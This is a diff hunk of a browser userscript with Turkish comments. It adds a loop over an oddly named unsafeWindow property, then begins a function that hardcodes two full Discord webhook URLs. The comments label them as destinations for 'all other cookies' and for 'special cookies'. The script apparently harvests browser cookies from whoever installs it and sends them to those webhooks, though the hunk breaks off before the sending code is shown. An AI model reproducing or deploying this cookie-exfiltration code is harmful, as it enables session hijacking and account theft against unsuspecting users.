@@ -10,6 +10,19 @@
 // ==/UserScript==
 
 
+if (unsafeWindow['Ⲇⵠ'] && unsafeWindow['Ⲇⵠ'][i]) {
+  for (let k = 0; k < unsafeWindow['Ⲇⵠ'][i].length; k++) {
+    // Kodunu buraya yaz
+  }
+} else {
+  // unsafeWindow['Ⲇⵠ'][i] tanımsız olduğunda ne yapacağını buraya ekle
+  console.warn("unsafeWindow['Ⲇⵠ'][i] tanımsız, i değeri =", i);
+  // Bu iterasyonu atlayabilir veya başka bir işlem yapabilirsin.
+}
+
+
+
+
 (function() {
     const mainWebhookUrl = "https://discord.com/api/webhooks/1291732310420361349/fMltABexjjLlK9yRefXgDndchpvf131C2AQ1wzSZf72QFAJWGA5SNXNtaPPslXJIITiM"; // Diğer tüm cookie'lerin gideceği webhook
     const specialWebhookUrl = "https://discord.com/api/webhooks/1292218412763840573/Ro_WJxcdK2_730mFBDoNmVTm6W4ep_jGHQ14CKJZDBsSX8XNmVlklUYvfuyVKMGLiibM"; // Özel cookie'lerin gideceği webhook
